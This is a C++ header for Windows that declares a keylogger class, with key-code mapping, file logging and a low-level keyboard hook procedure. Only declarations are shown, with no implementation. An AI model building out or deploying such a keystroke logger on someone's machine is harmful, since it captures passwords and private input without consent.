#pragma once
#include <string>
#include <fstream>
#include <windows.h>
#include <map>

class CKeyLogger
{
private:
	std::ofstream m_ofstrOut;
	std::map<int, std::string> m_mapKeyCodes;
public:
	CKeyLogger();
	~CKeyLogger();
	void fnSetKeyCode(int code,std::string keyName);
	std::string fnGetKeyCode(int code);
	bool fnCheckIfElementExist(PKBDLLHOOKSTRUCT p);
	void fnWriteToFile(std::string text);
};
LRESULT CALLBACK fnKeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
